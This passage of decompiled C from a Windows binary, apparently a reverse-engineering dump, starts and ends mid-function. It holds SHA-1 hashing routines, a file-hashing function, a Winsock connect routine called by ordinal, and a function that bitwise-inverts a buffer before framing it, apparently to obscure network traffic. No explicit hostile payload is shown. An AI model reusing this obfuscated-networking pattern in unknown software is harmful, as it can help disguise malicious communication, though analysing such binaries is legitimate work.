  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar2 = uVar5 + 0x6ed9eba1 + (uVar9 ^ uVar1 ^ uVar6) + (uVar3 >> 0x1b | uVar3 * 0x20) + uVar2;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar1 = uVar6 + 0x6ed9eba1 + (uVar9 ^ uVar4 ^ uVar3) + (uVar2 >> 0x1b | uVar2 * 0x20) + uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar2) & uVar4 | uVar6 & uVar2) + uVar3 + uVar9;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar2 = ((uVar5 ^ uVar1) & uVar6 | uVar5 & uVar1) + uVar2 + uVar4 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar8) & uVar5 | uVar3 & uVar8) + uVar1 + uVar6 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar1 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar2) & uVar8 | uVar9 & uVar2) + uVar7 + uVar5;
  *(uint *)(in_EAX + 0x4c) = uVar4;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar1 ^ uVar3) & uVar9 | uVar1 & uVar3) + uVar4 + uVar8 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar2 = ((uVar5 ^ uVar2) & uVar1 | uVar5 & uVar2) + uVar7 + uVar9 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = ((uVar8 ^ uVar3) & uVar5 | uVar8 & uVar3) + uVar4 + uVar1 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x54) = uVar4;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x58) = uVar3;
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar7;
  uVar3 = ((uVar2 ^ uVar9) & uVar8 | uVar2 & uVar9) + uVar3 + uVar5 + -0x70e44324 +
          (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x20) = uVar5;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar6 ^ uVar1) & uVar9 | uVar6 & uVar1) + uVar7 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar10 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = ((uVar4 ^ uVar3) & uVar6 | uVar4 & uVar3) + uVar5 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x24) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar8 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar10 ^ uVar2) & uVar4 | uVar10 & uVar2) + uVar1 + uVar6 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar8 ^ uVar3) & uVar10 | uVar8 & uVar3) + uVar1 + uVar4 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar2 = ((uVar2 ^ uVar5) & uVar8 | uVar2 & uVar5) + uVar7 + uVar10 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar7 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x34) = uVar4;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0x8f1bbcdc +
          ((uVar9 ^ uVar3) & uVar5 | uVar9 & uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar10 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar7 ^ uVar2) & uVar9 | uVar7 & uVar2) + uVar4 + uVar5 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x38) = uVar1;
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar3 = ((uVar10 ^ uVar3) & uVar7 | uVar10 & uVar3) + uVar1 + uVar9 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = ((uVar6 ^ uVar2) & uVar10 | uVar6 & uVar2) + uVar4 + uVar7 + -0x70e44324 +
          (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x40) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = ((uVar3 ^ uVar5) & uVar6 | uVar3 & uVar5) + uVar1 + uVar10 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar4 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0x8f1bbcdc +
          ((uVar8 ^ uVar2) & uVar5 | uVar8 & uVar2) + uVar7 + uVar6;
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar1 = ((uVar4 ^ uVar3) & uVar8 | uVar4 & uVar3) + uVar1 + uVar5 + -0x70e44324 +
          (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar6 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar6 ^ uVar2) + uVar3 + uVar8;
  uVar2 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x50) = uVar2;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar6 ^ uVar5 ^ uVar1) + uVar2 + uVar4;
  uVar4 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar1;
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x58) = uVar7;
  uVar3 = (uVar3 ^ uVar5 ^ uVar4) + uVar1 + uVar6 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar2 ^ uVar4) + uVar7 + uVar5;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar8 ^ uVar9 ^ uVar3) + uVar1 + uVar4;
  uVar5 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar3 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x20) = uVar3;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x24);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x24) = uVar7;
  uVar3 = (uVar1 >> 0x1b | uVar1 * 0x20) + 0xca62c1d6 + (uVar9 ^ uVar5 ^ uVar2) + uVar3 + uVar8;
  uVar4 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x1c) ^
          *(uint *)(in_EAX + 0x28);
  uVar2 = (uVar5 ^ uVar6 ^ uVar1) + uVar7 + uVar9 + -0x359d3e2a + (uVar3 >> 0x1b | uVar3 * 0x20);
  uVar8 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x28) = uVar1;
  uVar4 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar3 = (uVar3 ^ uVar6 ^ uVar8) + uVar1 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  *(uint *)(in_EAX + 0x2c) = uVar7;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar2 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  *(uint *)(in_EAX + 0x30) = uVar1;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar4 ^ uVar5 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x34) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar9 ^ uVar2) + uVar1 + uVar4;
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar5 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x3c) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x24);
  uVar10 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x44) = uVar1;
  uVar9 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar10 ^ uVar3) + uVar1 + uVar8;
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x48) = uVar1;
  uVar7 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar6 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar10 ^ uVar9 ^ uVar2) + uVar1 + uVar5;
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x44);
  uVar1 = (uVar9 ^ uVar6 ^ uVar3) + uVar7 + uVar10 + -0x359d3e2a + (uVar2 >> 0x1b | uVar2 * 0x20);
  uVar8 = uVar3 >> 2 | uVar3 * 0x40000000;
  uVar3 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x50) = uVar3;
  uVar5 = uVar2 >> 2 | uVar2 * 0x40000000;
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x54) = uVar7;
  uVar3 = (uVar2 ^ uVar6 ^ uVar8) + uVar3 + uVar9 + -0x359d3e2a + (uVar1 >> 0x1b | uVar1 * 0x20);
  uVar4 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x20);
  uVar2 = (uVar3 >> 0x1b | uVar3 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar1 ^ uVar8) + uVar7 + uVar6;
  uVar7 = uVar1 >> 2 | uVar1 * 0x40000000;
  uVar1 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  *(uint *)(in_EAX + 0x58) = uVar1;
  *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar2;
  *(int *)(in_EAX + 8) =
       *(int *)(in_EAX + 8) +
       (uVar2 >> 0x1b | uVar2 * 0x20) + 0xca62c1d6 + (uVar5 ^ uVar7 ^ uVar3) + uVar1 + uVar8;
  *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + (uVar3 >> 2 | uVar3 * 0x40000000);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar7;
  *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + uVar5;
  return;
}



void __cdecl FUN_004053a0(void *param_1,uint param_2)

{
  uint uVar1;
  uint *puVar2;
  int iVar3;
  uint *unaff_EBX;
  size_t _Size;
  uint uVar4;
  
  uVar4 = *unaff_EBX & 0x3f;
  uVar1 = *unaff_EBX + param_2;
  _Size = 0x40 - uVar4;
  *unaff_EBX = uVar1;
  if (uVar1 < param_2) {
    unaff_EBX[1] = unaff_EBX[1] + 1;
  }
  if (_Size <= param_2) {
    do {
      _memcpy((void *)((int)unaff_EBX + uVar4 + 0x1c),param_1,_Size);
      param_2 = param_2 - _Size;
      param_1 = (void *)((int)param_1 + _Size);
      _Size = 0x40;
      uVar4 = 0;
      iVar3 = 0x10;
      puVar2 = unaff_EBX + 0x17;
      do {
        uVar1 = puVar2[-1];
        puVar2 = puVar2 + -1;
        iVar3 = iVar3 + -1;
        *puVar2 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
      } while (iVar3 != 0);
      FUN_004043f0();
    } while (0x3f < param_2);
  }
  _memcpy((void *)(uVar4 + 0x1c + (int)unaff_EBX),param_1,param_2);
  return;
}



void __cdecl FUN_00405450(int param_1)

{
  uint uVar1;
  sbyte sVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  uint *unaff_ESI;
  uint uVar7;
  
  uVar3 = *unaff_ESI;
  uVar7 = uVar3 & 0x3f;
  uVar4 = uVar7 + 3 >> 2;
  if (uVar4 != 0) {
    puVar6 = (uint *)((int)unaff_ESI + (uVar7 + 3 & 0xfffffffc) + 0x1c);
    do {
      uVar1 = puVar6[-1];
      puVar6 = puVar6 + -1;
      uVar4 = uVar4 - 1;
      *puVar6 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
    } while (uVar4 != 0);
  }
  sVar2 = (~(byte)uVar7 & 3) * '\b';
  *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) =
       -0x80 << sVar2 & *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) | 0x80 << sVar2;
  if (uVar7 < 0x38) {
    uVar3 = (uVar7 >> 2) + 1;
    if (0xd < uVar3) goto LAB_004054e9;
  }
  else {
    if (uVar7 < 0x3c) {
      unaff_ESI[0x16] = 0;
    }
    FUN_004043f0();
    uVar3 = 0;
  }
  puVar6 = unaff_ESI + uVar3 + 7;
  for (iVar5 = 0xe - uVar3; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
LAB_004054e9:
  unaff_ESI[0x16] = *unaff_ESI * 8;
  unaff_ESI[0x15] = unaff_ESI[1] * 8 | *unaff_ESI >> 0x1d;
  FUN_004043f0();
  uVar3 = 0;
  do {
    uVar4 = uVar3 + 1;
    *(char *)(uVar3 + param_1) =
         (char)(*(uint *)((int)unaff_ESI + (uVar3 & 0xfffffffc) + 8) >> (~(byte)uVar3 & 3) * '\b');
    uVar3 = uVar4;
  } while (uVar4 < 0x14);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00405540(wchar_t *param_1)

{
  uint uVar1;
  uint uVar2;
  undefined4 *unaff_EDI;
  FILE *local_1068;
  uint local_1064;
  undefined4 local_1060;
  undefined4 local_105c;
  undefined4 local_1058;
  undefined4 local_1054;
  undefined4 local_1050;
  undefined4 local_104c;
  undefined4 local_1048;
  undefined local_1004 [4096];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_1068;
  local_1068 = (FILE *)0x0;
  uVar2 = 0;
  __wfopen_s(&local_1068,param_1,(wchar_t *)&DAT_0041dcbc);
  if (local_1068 != (FILE *)0x0) {
    _fseek(local_1068,0,2);
    local_1064 = _ftell(local_1068);
    _fseek(local_1068,0,0);
    local_105c = 0;
    local_1060 = 0;
    local_1058 = 0x67452301;
    local_1054 = 0xefcdab89;
    local_1050 = 0x98badcfe;
    local_104c = 0x10325476;
    local_1048 = 0xc3d2e1f0;
    uVar1 = _fread(local_1004,1,0x1000,local_1068);
    while (uVar1 != 0) {
      FUN_004053a0(local_1004,uVar1);
      uVar2 = uVar2 + uVar1;
      uVar1 = _fread(local_1004,1,0x1000,local_1068);
    }
    FUN_00405450((int)unaff_EDI);
    _fclose(local_1068);
    if (local_1064 <= uVar2) {
      ___security_check_cookie_4(local_4 ^ (uint)&local_1068);
      return;
    }
  }
  *unaff_EDI = 0;
  unaff_EDI[1] = 0;
  unaff_EDI[2] = 0;
  unaff_EDI[3] = 0;
  unaff_EDI[4] = 0;
  ___security_check_cookie_4(local_4 ^ (uint)&local_1068);
  return;
}



void __thiscall FUN_004056a0(void *this,undefined4 param_1)

{
  int iVar1;
  int *unaff_EBX;
  wchar_t *_Dst;
  wchar_t *_Src;
  undefined4 local_9b0 [105];
  wchar_t local_80c;
  undefined local_80a [2038];
  uint uStack_14;
  uint uStack_10;
  uint local_8;
  undefined4 uStack_4;
  
  local_8 = DAT_00422044 ^ (uint)local_9b0;
  local_80c = L'\0';
  _memset(local_80a,0,0x7fe);
  _Dst = &local_80c;
  if (this != (void *)0x0) {
    _Dst = (wchar_t *)this;
  }
  *_Dst = L'\0';
  local_9b0[0] = 0;
  iVar1 = Ordinal_115(0x101);
  if (iVar1 != 0) {
LAB_00405711:
    _wcscpy_s(_Dst,0x3ff,(wchar_t *)&LAB_0041de54);
    _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041de74);
    _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041de78);
    ___security_check_cookie_4(uStack_10 ^ (uint)&stack0xfffff648);
    return;
  }
  iVar1 = Ordinal_23(2,1,6);
  *unaff_EBX = iVar1;
  if (iVar1 == -1) goto LAB_00405711;
  iVar1 = Ordinal_52(param_1);
  if (iVar1 == 0) {
    Ordinal_11(param_1);
    iVar1 = Ordinal_51(&stack0xfffff640,4,2);
    if (iVar1 != 0) goto LAB_004057f6;
    _Src = (wchar_t *)&LAB_0041de54;
  }
  else {
LAB_004057f6:
    Ordinal_9(uStack_4);
    iVar1 = Ordinal_4(*unaff_EBX,&stack0xfffff644,0x10);
    if (iVar1 == 0) goto LAB_004057dc;
    _Src = (wchar_t *)&DAT_0041deb8;
  }
  _wcscpy_s(_Dst,0x3ff,_Src);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041de74);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041de78);
  if (*unaff_EBX != 0) {
    Ordinal_3(*unaff_EBX);
    *unaff_EBX = 0;
  }
LAB_004057dc:
  ___security_check_cookie_4(uStack_14 ^ (uint)&stack0xfffff644);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 __cdecl FUN_00405840(int *param_1,void *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  size_t unaff_EDI;
  undefined4 local_4;
  
  iVar2 = 0;
  local_4 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)operator_new(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
